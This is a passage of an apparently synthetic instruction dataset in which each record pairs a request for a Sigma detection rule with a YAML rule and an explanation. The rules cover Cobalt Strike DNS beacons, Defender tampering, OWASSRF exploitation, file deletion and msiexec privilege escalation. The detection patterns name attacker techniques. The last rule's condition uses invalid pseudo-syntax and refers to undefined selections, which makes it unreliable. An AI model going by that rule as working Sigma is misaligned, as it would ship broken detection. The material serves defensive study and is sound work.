      "answer": "In order to detect obfuscated use of Clip.exe to execute PowerShell, you should focus on monitoring the PowerShell module activity within the Windows environment. Specifically, look for events where the command line execution patterns match the use of 'cmd' followed by either '/c' or '/r' parameters, and closely thereafter, involves 'clip.exe' or 'clip' command. The detection becomes particularly specific with the inclusion of patterns that combine 'clip' with PowerShell commands that seem to manipulate the clipboard content in a sophisticated manner, indicated by the complex regex pattern provided. These patterns also include the use of '&&' operator, suggesting an attempt to chain commands in a manner that's not typical for regular system or user operations. \n\nMonitoring should be performed with high sensitivity due to the high level of potential impact, but it\u2019s important to note that as of now, the potential for unknown false positives exists, indicating that not all matched patterns could lead to genuine threats. However, given the obfuscated nature of the execution method, any hits on these patterns should be considered with a degree of caution. \n\nThis activity aligns with techniques known in cybersecurity frameworks which describe tactics such as Execution, Defense Evasion, and Command and Control, showing the attacker's efforts to execute commands covertly, evade detection mechanisms, and maintain control over the compromised system through unusual use of system utilities like Clip.exe in conjunction with PowerShell scripting."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting restoration of files from the defender quarantine.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the restoration of files from the defender quarantine, you should monitor Windows Defender (WinDefend) logs for events with the Event ID 1009. This Event ID indicates that the antimalware platform has restored an item from quarantine. It's essential to note that while this activity can often signify a potentially suspicious action, especially if not performed by an authorized administrator, it may also occur as part of legitimate administration activities when a file is determined to be safe and thus restored. Therefore, while this indicator is crucial for identifying potential security incidents, it's also advised to consider the context of the restoration to minimize false positives.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: windefend\ndetection:\n    selection:\n        EventID: 1009 # The antimalware platform restored an item from quarantine.\n    condition: selection\nfalsepositives:\n    - Legitimate administrator activity restoring a file\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: windefend\ndetection:\n    selection:\n        EventID: 1009 # The antimalware platform restored an item from quarantine.\n    condition: selection\nfalsepositives:\n    - Legitimate administrator activity restoring a file\nlevel: high\n",
      "question": "restoration of files from the defender quarantine",
      "answer": "In order to detect the restoration of files from the defender quarantine, you should monitor Windows Defender (WinDefend) logs for events with the Event ID 1009. This Event ID indicates that the antimalware platform has restored an item from quarantine. It's essential to note that while this activity can often signify a potentially suspicious action, especially if not performed by an authorized administrator, it may also occur as part of legitimate administration activities when a file is determined to be safe and thus restored. Therefore, while this indicator is crucial for identifying potential security incidents, it's also advised to consider the context of the restoration to minimize false positives."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Adversaries may abuse PowerShell commands and scripts for execution.\nPowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system\n.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect adversaries abusing PowerShell commands and scripts for execution, which is a powerful interactive command-line interface and scripting environment included in the Windows operating system, you should focus on monitoring PowerShell script activities. This involves enabling Script Block Logging, which is a requirement for capturing the necessary data. Specifically, you should look for the execution of scripts that initiate a new PowerShell session to another computer, identifiable by the presence of both 'New-PSSession' and '-ComputerName' within the script text. Such activities could indicate malicious use, although it is also important to consider that the creation of new PowerShell sessions to remote computers could be part of legitimate administrative tasks. Thus, while this detection is set at a medium level of caution, potential false positives involve legitimate administrative scripts carrying out authorized functions.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection:\n        ScriptBlockText|contains|all:\n            - 'New-PSSession'\n            - '-ComputerName '\n    condition: selection\nfalsepositives:\n    - Legitimate administrative script\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection:\n        ScriptBlockText|contains|all:\n            - 'New-PSSession'\n            - '-ComputerName '\n    condition: selection\nfalsepositives:\n    - Legitimate administrative script\nlevel: medium\n",
      "question": "Adversaries may abuse PowerShell commands and scripts for execution.\nPowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system\n",
      "answer": "In order to detect adversaries abusing PowerShell commands and scripts for execution, which is a powerful interactive command-line interface and scripting environment included in the Windows operating system, you should focus on monitoring PowerShell script activities. This involves enabling Script Block Logging, which is a requirement for capturing the necessary data. Specifically, you should look for the execution of scripts that initiate a new PowerShell session to another computer, identifiable by the presence of both 'New-PSSession' and '-ComputerName' within the script text. Such activities could indicate malicious use, although it is also important to consider that the creation of new PowerShell sessions to remote computers could be part of legitimate administrative tasks. Thus, while this detection is set at a medium level of caution, potential false positives involve legitimate administrative scripts carrying out authorized functions."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect adversaries attempting to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network, you should monitor Windows process creation logs for occurrences of processes that are pertinent to networking command utilities. Specifically, look out for processes named 'net.exe' or 'net1.exe', as these are commonly used tools for querying network connections. Further, pay attention to the command line arguments passed to these executables, especially arguments ending with ' use', ' sessions', or contain ' use ', ' sessions ' in the middle of the command. These particular command-line arguments are indicative of attempts to list network connections or sessions, which can be a tactic used by attackers to gather information about network resources accessible from the currently compromised system or remote systems. \n\nBear in mind that detecting the mere usage of these commands may lead to false positives, as the 'net' command can also be used for legitimate network administration activities. Thus, a low level of alert should be assigned to these observations, and they should be further investigated to confirm malicious intent. This approach aligns with understanding the tactics and techniques outlined by MITRE ATT&CK concerning the gathering of network information, specifically focusing on the detection of potential adversary actions without relying on predefined signatures or patterns.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith:\n            - '\\net.exe'\n            - '\\net1.exe'\n        - OriginalFileName:\n            - 'net.exe'\n            - 'net1.exe'\n    selection_cli:\n        - CommandLine|endswith:\n            - ' use'\n            - ' sessions'\n        - CommandLine|contains:\n            - ' use '\n            - ' sessions '\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: low\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith:\n            - '\\net.exe'\n            - '\\net1.exe'\n        - OriginalFileName:\n            - 'net.exe'\n            - 'net1.exe'\n    selection_cli:\n        - CommandLine|endswith:\n            - ' use'\n            - ' sessions'\n        - CommandLine|contains:\n            - ' use '\n            - ' sessions '\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: low\n",
      "question": "Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network.",
      "answer": "In order to detect adversaries attempting to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network, you should monitor Windows process creation logs for occurrences of processes that are pertinent to networking command utilities. Specifically, look out for processes named 'net.exe' or 'net1.exe', as these are commonly used tools for querying network connections. Further, pay attention to the command line arguments passed to these executables, especially arguments ending with ' use', ' sessions', or contain ' use ', ' sessions ' in the middle of the command. These particular command-line arguments are indicative of attempts to list network connections or sessions, which can be a tactic used by attackers to gather information about network resources accessible from the currently compromised system or remote systems. \n\nBear in mind that detecting the mere usage of these commands may lead to false positives, as the 'net' command can also be used for legitimate network administration activities. Thus, a low level of alert should be assigned to these observations, and they should be further investigated to confirm malicious intent. This approach aligns with understanding the tactics and techniques outlined by MITRE ATT&CK concerning the gathering of network information, specifically focusing on the detection of potential adversary actions without relying on predefined signatures or patterns."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting suspicious DNS queries known from Cobalt Strike beacons.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect suspicious DNS queries known from Cobalt Strike beacons, you should: Monitor DNS logs for queries that begin with 'aaa.stage.' or 'post.1'. Additionally, keep an eye out for queries containing the pattern '.stage.123456.' within them. These specific patterns in DNS queries are indicative of Cobalt Strike beacon communication, which is a common tool used in cyber attacks to establish a backdoor for persistent access or to exfiltrate data. Any detection of these query patterns should be considered critical, as they are a strong signal of an ongoing or imminent threat. Given the critical nature of these detections, there are no known benign causes for these query patterns (no known false positives), implying that investigations should be prioritized when alerts are triggered. This analysis focuses on DNS logs, highlighting the importance of monitoring and analyzing DNS traffic to uncover potential malicious activities related to Cobalt Strike beacons.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: dns\ndetection:\n    selection1:\n        query|startswith:\n            - 'aaa.stage.'\n            - 'post.1'\n    selection2:\n        query|contains: '.stage.123456.'\n    condition: 1 of selection*\nfalsepositives:\n    - Unknown\nlevel: critical\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: dns\ndetection:\n    selection1:\n        query|startswith:\n            - 'aaa.stage.'\n            - 'post.1'\n    selection2:\n        query|contains: '.stage.123456.'\n    condition: 1 of selection*\nfalsepositives:\n    - Unknown\nlevel: critical\n",
      "question": "suspicious DNS queries known from Cobalt Strike beacons",
      "answer": "In order to detect suspicious DNS queries known from Cobalt Strike beacons, you should: Monitor DNS logs for queries that begin with 'aaa.stage.' or 'post.1'. Additionally, keep an eye out for queries containing the pattern '.stage.123456.' within them. These specific patterns in DNS queries are indicative of Cobalt Strike beacon communication, which is a common tool used in cyber attacks to establish a backdoor for persistent access or to exfiltrate data. Any detection of these query patterns should be considered critical, as they are a strong signal of an ongoing or imminent threat. Given the critical nature of these detections, there are no known benign causes for these query patterns (no known false positives), implying that investigations should be prioritized when alerts are triggered. This analysis focuses on DNS logs, highlighting the importance of monitoring and analyzing DNS traffic to uncover potential malicious activities related to Cobalt Strike beacons."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting execution of the builtin \"del\"/\"erase\" commands in order to delete files.\nAdversaries may delete files left behind by the actions of their intrusion activity.\nMalware, tools, or other non-native files dropped or created on a system by an adversary may leave traces to indicate to what was done within a network and how.\nRemoval of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\n.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect execution of the builtin \"del\"/\"erase\" commands in order to delete files since adversaries may delete files left behind by the actions of their intrusion activity, you should: Focus on monitoring the creation of processes on Windows systems. Specifically, watch for the initiation of the command prompt executable 'cmd.exe', identified either through the image path ending with '\\cmd.exe' or the original file name being 'Cmd.Exe'. Once command prompt activity is identified, further inspect if any command lines include the use of 'del ' or 'erase ' commands which are known to delete files. Additionally, pay special attention to command lines that contain flags like ' /f' indicating the forced deletion of read-only files, ' /s' for the deletion of specified files from all subdirectories, and ' /q' for quiet mode operation where no confirmation is asked when deleting files globally. This form of monitoring helps in identifying the malicious deletion of files which could be part of an adversary's efforts to minimize their footprint and hide their activities following an intrusion. Be aware, however, that the level of false positives can vary, and it might be necessary to further refine detection by considering additional context such as the parent image of the process or specific command line patterns deemed legitimate within your environment.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\cmd.exe'\n        - OriginalFileName: 'Cmd.Exe'\n    selection_del:\n        CommandLine|contains:\n            - 'del '\n            - 'erase '\n    selection_flags:\n        CommandLine|contains:\n            - ' /f' # Force deleting of read-only files.\n            - ' /s' # Delete specified files from all subdirectories.\n            - ' /q' # Quiet mode, do not ask if ok to delete on global wildcard\n    condition: all of selection_*\nfalsepositives:\n    - False positives levels will differ Depending on the environment. You can use a combination of ParentImage and other keywords from the CommandLine field to filter legitimate activity\nlevel: low\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\cmd.exe'\n        - OriginalFileName: 'Cmd.Exe'\n    selection_del:\n        CommandLine|contains:\n            - 'del '\n            - 'erase '\n    selection_flags:\n        CommandLine|contains:\n            - ' /f' # Force deleting of read-only files.\n            - ' /s' # Delete specified files from all subdirectories.\n            - ' /q' # Quiet mode, do not ask if ok to delete on global wildcard\n    condition: all of selection_*\nfalsepositives:\n    - False positives levels will differ Depending on the environment. You can use a combination of ParentImage and other keywords from the CommandLine field to filter legitimate activity\nlevel: low\n",
      "question": "execution of the builtin \"del\"/\"erase\" commands in order to delete files.\nAdversaries may delete files left behind by the actions of their intrusion activity.\nMalware, tools, or other non-native files dropped or created on a system by an adversary may leave traces to indicate to what was done within a network and how.\nRemoval of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\n",
      "answer": "In order to detect execution of the builtin \"del\"/\"erase\" commands in order to delete files since adversaries may delete files left behind by the actions of their intrusion activity, you should: Focus on monitoring the creation of processes on Windows systems. Specifically, watch for the initiation of the command prompt executable 'cmd.exe', identified either through the image path ending with '\\cmd.exe' or the original file name being 'Cmd.Exe'. Once command prompt activity is identified, further inspect if any command lines include the use of 'del ' or 'erase ' commands which are known to delete files. Additionally, pay special attention to command lines that contain flags like ' /f' indicating the forced deletion of read-only files, ' /s' for the deletion of specified files from all subdirectories, and ' /q' for quiet mode operation where no confirmation is asked when deleting files globally. This form of monitoring helps in identifying the malicious deletion of files which could be part of an adversary's efforts to minimize their footprint and hide their activities following an intrusion. Be aware, however, that the level of false positives can vary, and it might be necessary to further refine detection by considering additional context such as the parent image of the process or specific command line patterns deemed legitimate within your environment."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Mesh Agent service installation. Mesh Agent is used to remotely manage computers.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect a Mesh Agent service installation, which is used to remotely manage computers, you should: Focus on monitoring Windows System service logs. Specifically, look for events generated by the Service Control Manager with an Event ID of 7045. This Event ID signifies service installations, among which the Mesh Agent, a tool for remote management, might be of particular interest. Detection is based on two primary indicators: the presence of 'MeshAgent.exe' in the ImagePath of the newly installed service and the inclusion of 'Mesh Agent' in the ServiceName. Both conditions must be met to consider the event potentially malicious. It is important to note, however, that there may be legitimate uses of the Mesh Agent tool, and such instances should be considered as potential false positives. The level of concern for this activity is classified as medium, reflecting the need for further investigation upon detection. The tags associated with this detection are 'Persistence', 'Privilege Escalation', and 'Execution' as it relates to the MITRE ATT&CK tactics, highlighting the possible malicious use of the Mesh Agent in gaining persistent access, elevating privileges, or executing commands remotely on a victim's machine.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: system\ndetection:\n    selection_root:\n        Provider_Name: 'Service Control Manager'\n        EventID: 7045\n    selection_service:\n        - ImagePath|contains: 'MeshAgent.exe'\n        - ServiceName|contains: 'Mesh Agent'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate use of the tool\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: system\ndetection:\n    selection_root:\n        Provider_Name: 'Service Control Manager'\n        EventID: 7045\n    selection_service:\n        - ImagePath|contains: 'MeshAgent.exe'\n        - ServiceName|contains: 'Mesh Agent'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate use of the tool\nlevel: medium\n",
      "question": "Mesh Agent service installation. Mesh Agent is used to remotely manage computers",
      "answer": "In order to detect a Mesh Agent service installation, which is used to remotely manage computers, you should: Focus on monitoring Windows System service logs. Specifically, look for events generated by the Service Control Manager with an Event ID of 7045. This Event ID signifies service installations, among which the Mesh Agent, a tool for remote management, might be of particular interest. Detection is based on two primary indicators: the presence of 'MeshAgent.exe' in the ImagePath of the newly installed service and the inclusion of 'Mesh Agent' in the ServiceName. Both conditions must be met to consider the event potentially malicious. It is important to note, however, that there may be legitimate uses of the Mesh Agent tool, and such instances should be considered as potential false positives. The level of concern for this activity is classified as medium, reflecting the need for further investigation upon detection. The tags associated with this detection are 'Persistence', 'Privilege Escalation', and 'Execution' as it relates to the MITRE ATT&CK tactics, highlighting the possible malicious use of the Mesh Agent in gaining persistent access, elevating privileges, or executing commands remotely on a victim's machine."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting known WMI recon method to look for unquoted service paths, often used by pentest inside of powershell scripts attackers enum scripts.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect known WMI recon method to look for unquoted service paths, often used by pentest inside of PowerShell scripts attackers enum scripts, you should: Monitor Windows Script Block Logging, which needs to be enabled for this detection to work. Specifically, keep an eye out for the use of PowerShell scripts that contain text indicating the usage of either 'Get-WmiObject ' or the shorthand 'gwmi ' command. These commands are red flags especially when they are used in conjunction with querying ' Win32_Service ' along with properties like 'Name', 'DisplayName', 'PathName', and 'StartMode'. These patterns are indicative of reconnaissance activities aiming to identify unquoted service paths, a common vector for privilege escalation or persistent access by attackers. Be mindful though, that this alert could trigger on benign activities, and as such, some instances flagged by this detection may not be malicious and would require further investigation to ascertain their nature. The alert level for this activity is set to medium, reflecting its potential severity while acknowledging the possibility of false positives.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection:\n        ScriptBlockText|contains:\n            - 'Get-WmiObject '\n            - 'gwmi '\n        ScriptBlockText|contains|all:\n            - ' Win32_Service '\n            - 'Name'\n            - 'DisplayName'\n            - 'PathName'\n            - 'StartMode'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection:\n        ScriptBlockText|contains:\n            - 'Get-WmiObject '\n            - 'gwmi '\n        ScriptBlockText|contains|all:\n            - ' Win32_Service '\n            - 'Name'\n            - 'DisplayName'\n            - 'PathName'\n            - 'StartMode'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "known WMI recon method to look for unquoted service paths, often used by pentest inside of powershell scripts attackers enum scripts",
      "answer": "In order to detect known WMI recon method to look for unquoted service paths, often used by pentest inside of PowerShell scripts attackers enum scripts, you should: Monitor Windows Script Block Logging, which needs to be enabled for this detection to work. Specifically, keep an eye out for the use of PowerShell scripts that contain text indicating the usage of either 'Get-WmiObject ' or the shorthand 'gwmi ' command. These commands are red flags especially when they are used in conjunction with querying ' Win32_Service ' along with properties like 'Name', 'DisplayName', 'PathName', and 'StartMode'. These patterns are indicative of reconnaissance activities aiming to identify unquoted service paths, a common vector for privilege escalation or persistent access by attackers. Be mindful though, that this alert could trigger on benign activities, and as such, some instances flagged by this detection may not be malicious and would require further investigation to ascertain their nature. The alert level for this activity is set to medium, reflecting its potential severity while acknowledging the possibility of false positives."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Detect use of Ilasm.exe to compile c# code into dll or exe..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the use of Ilasm.exe to compile C# code into dll or exe, you should: Monitor process creation logs on Windows systems for instances where the process image name ends with '\\ilasm.exe' or the original file name is identified as 'ilasm.exe'. This monitoring helps in identifying potential misuse of the Ilasm.exe utility, which is a legitimate tool used for compiling .NET Intermediate Language (IL) code into executable files or DLLs, but can be exploited for malicious purposes such as generating malware on an infected system. Since this behavior might not always signify a security threat, it is marked with a medium level of concern, and unknown false positives are acknowledged, emphasizing the need for context and further investigation upon detection.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        - Image|endswith: '\\ilasm.exe'\n        - OriginalFileName: 'ilasm.exe'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        - Image|endswith: '\\ilasm.exe'\n        - OriginalFileName: 'ilasm.exe'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "Detect use of Ilasm.exe to compile c# code into dll or exe.",
      "answer": "In order to detect the use of Ilasm.exe to compile C# code into dll or exe, you should: Monitor process creation logs on Windows systems for instances where the process image name ends with '\\ilasm.exe' or the original file name is identified as 'ilasm.exe'. This monitoring helps in identifying potential misuse of the Ilasm.exe utility, which is a legitimate tool used for compiling .NET Intermediate Language (IL) code into executable files or DLLs, but can be exploited for malicious purposes such as generating malware on an infected system. Since this behavior might not always signify a security threat, it is marked with a medium level of concern, and unknown false positives are acknowledged, emphasizing the need for context and further investigation upon detection."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting potential tampering with Windows Defender settings such as adding exclusion using wmic.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect potential tampering with Windows Defender settings such as adding exclusion using wmic, you should: Monitor the creation of processes on Windows systems, specifically looking for instances where the WMIC (Windows Management Instrumentation Command-line) utility, either referenced by its original filename 'wmic.exe' or any executable path ending with '\\WMIC.exe', is involved. Further scrutiny is required when the command line parameters include actions that modify the Windows Defender settings, notably accessing or altering configurations within the '/Namespace:\\\\\\\\root\\\\Microsoft\\\\Windows\\\\Defender' directory. Any such activity should be flagged as suspicious with a high level of concern due to the rarity of legitimate use cases that involve direct manipulation of Windows Defender settings via WMIC, indicating a probable attempt at undermining the system's defense mechanisms.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - OriginalFileName: 'wmic.exe'\n        - Image|endswith: '\\WMIC.exe'\n    selection_cli:\n        CommandLine|contains: '/Namespace:\\\\\\\\root\\\\Microsoft\\\\Windows\\\\Defender'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - OriginalFileName: 'wmic.exe'\n        - Image|endswith: '\\WMIC.exe'\n    selection_cli:\n        CommandLine|contains: '/Namespace:\\\\\\\\root\\\\Microsoft\\\\Windows\\\\Defender'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "potential tampering with Windows Defender settings such as adding exclusion using wmic",
      "answer": "In order to detect potential tampering with Windows Defender settings such as adding exclusion using wmic, you should: Monitor the creation of processes on Windows systems, specifically looking for instances where the WMIC (Windows Management Instrumentation Command-line) utility, either referenced by its original filename 'wmic.exe' or any executable path ending with '\\WMIC.exe', is involved. Further scrutiny is required when the command line parameters include actions that modify the Windows Defender settings, notably accessing or altering configurations within the '/Namespace:\\\\\\\\root\\\\Microsoft\\\\Windows\\\\Defender' directory. Any such activity should be flagged as suspicious with a high level of concern due to the rarity of legitimate use cases that involve direct manipulation of Windows Defender settings via WMIC, indicating a probable attempt at undermining the system's defense mechanisms."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting exploitation attempt of the OWASSRF variant targeting exchange servers using publicly available POC. It uses the OWA endpoint to access the powershell backend endpoint.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect exploitation attempt of the OWASSRF variant targeting exchange servers using publicly available POC. It uses the OWA endpoint to access the powershell backend endpoint, you should: Monitor web server logs for specific patterns that could indicate an attack. Look within the webserver category for instances where the cs-user-agent matches Mozilla/5.0 compatible with Windows NT 10.0 and acting as Chrome 105.0.5195.54 Safari/537.36. These requests should also be using the 'POST' method and returning a status code of 200, indicating a successful request. Crucially, the URI query should contain both '/owa/mastermailbox' and '/powershell' in the same request. This combination of criteria helps identify potential malicious activity aimed at exploiting the exchange server by leveraging the OWA interface to interact with PowerShell endpoints. False positives for this detection strategy are unlikely, indicating a high level of confidence in the specificity of this detection method for identifying potential exploits. The criticality of these detections points to the urgency and importance of monitoring for these specific conditions as part of a comprehensive cybersecurity defense strategy against attacks targeting exchange servers through the OWA interface.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: webserver\ndetection:\n    selection:\n        # Look for the header: X-OWA-ExplicitLogonUser: owa/mastermailbox@outlook.com\n        cs-user-agent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.54 Safari/537.36'\n        cs-method: 'POST'\n        sc-status: 200\n        cs-uri-query|contains|all:\n            - '/owa/mastermailbox'\n            - '/powershell'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: critical\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: webserver\ndetection:\n    selection:\n        # Look for the header: X-OWA-ExplicitLogonUser: owa/mastermailbox@outlook.com\n        cs-user-agent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.54 Safari/537.36'\n        cs-method: 'POST'\n        sc-status: 200\n        cs-uri-query|contains|all:\n            - '/owa/mastermailbox'\n            - '/powershell'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: critical\n",
      "question": "exploitation attempt of the OWASSRF variant targeting exchange servers using publicly available POC. It uses the OWA endpoint to access the powershell backend endpoint",
      "answer": "In order to detect exploitation attempt of the OWASSRF variant targeting exchange servers using publicly available POC. It uses the OWA endpoint to access the powershell backend endpoint, you should: Monitor web server logs for specific patterns that could indicate an attack. Look within the webserver category for instances where the cs-user-agent matches Mozilla/5.0 compatible with Windows NT 10.0 and acting as Chrome 105.0.5195.54 Safari/537.36. These requests should also be using the 'POST' method and returning a status code of 200, indicating a successful request. Crucially, the URI query should contain both '/owa/mastermailbox' and '/powershell' in the same request. This combination of criteria helps identify potential malicious activity aimed at exploiting the exchange server by leveraging the OWA interface to interact with PowerShell endpoints. False positives for this detection strategy are unlikely, indicating a high level of confidence in the specificity of this detection method for identifying potential exploits. The criticality of these detections points to the urgency and importance of monitoring for these specific conditions as part of a comprehensive cybersecurity defense strategy against attacks targeting exchange servers through the OWA interface."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting This rule will looks any process with low privilege launching Windows Installer service (msiexec.exe) that tries to install MSI packages with SYSTEM privilege.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect any process with low privilege launching Windows Installer service (msiexec.exe) that tries to install MSI packages with SYSTEM privilege, you should monitor Windows process creation logs for specific patterns indicating potential exploitation of permissions elevation. Specifically:\n\n1. Look for instances where a process is created with 'System' integrity level or by the 'NT AUTHORITY\\SYSTEM' user. These represent high privilege operations likely performed by the system itself or a system administrator. However, in the context of suspicious activity, they could indicate malicious attempts to execute code or commands with elevated privileges.\n\n2. Identify any process named 'msiexec.exe' that does not originate from a user with 'NT AUTHORITY\\SYSTEM' privileges. The Windows Installer service, represented by 'msiexec.exe', is legitimate, but when initiated by low-privilege users, it may indicate an attempt to leverage Windows Installer for malicious purposes.\n\n3. Detect processes that have a parent process identifier (ParentProcessGuid) matching a previously noted suspicious process identifier (%suspicious_guid%). This linkage between processes suggests a chain of execution potentially leading to privilege escalation.\n\n4. Specifically target processes that are child of a suspect process and meet these criteria:\n   - The executable image path contains '\\Windows\\Installer\\' and has an 'msi' extension, ending with 'tmp'. These characteristics are unusual for legitimate use of the Windows Installer and may signify tampering or malicious MSI packages being installed.\n   - The process is executed at the system integrity level or by the 'NT AUTHORITY\\SYSTEM' user. This indicates an intent to execute with elevated privileges, bypassing normal user access controls.\n\nThe conditions for alerting include:\n   - Capturing the ProcessGuid of any 'msiexec.exe' process (not initiated by 'NT AUTHORITY\\SYSTEM') as a suspicious identifier.\n   - Triggering an alert if there\u2019s a process, originated with SYSTEM privilege, attempting to install an MSI package following the suspicious 'msiexec.exe' execution or directly attempting to execute 'msiexec.exe' with SYSTEM privileges, satisfying the specified image path conditions.\n\nIn analyzing logs for these patterns, one must account for false positives, such as legitimate system administrator activities that may involve similar process creation characteristics. Monitoring should be set at a high level of alert due to the potential severity of exploiting the Windows Installer service to elevate privileges maliciously.\n\nBy examining these specific indicators within the Windows process creation logs, you can uncover attempts to exploit the Windows Installer service to execute MSI packages with elevated SYSTEM privilege, a tactic often leveraged by attackers seeking to gain higher access rights on a compromised system.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    system_integrity:\n        IntegrityLevel: 'System'\n    system_user:\n        User: 'NT AUTHORITY\\SYSTEM'\n    image_1:\n        Image|contains|all:\n            - '\\Windows\\Installer\\'\n            - 'msi'\n        Image|endswith:\n            - 'tmp'\n    image_2:\n        Image|endswith: '\\msiexec.exe'\n    child_of_suspicious_guid:\n        ParentProcessGuid: '%suspicious_guid%'\n    condition: write ProcessGuid from (event_id and image_2 and not system_user) to %suspicious_guid%; then if (child_of_suspicious_guid and event_id and image_1 and system_user) or (suspicious_guid and event_id and image_2 and system_user and integrity_level) -> alert\nfields:\n    - EventID\n    - IntegrityLevel\n    - User\n    - Image\n    - ParentProcessGuid\nfalsepositives:\n    - System administrator usage\nlevel: high",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
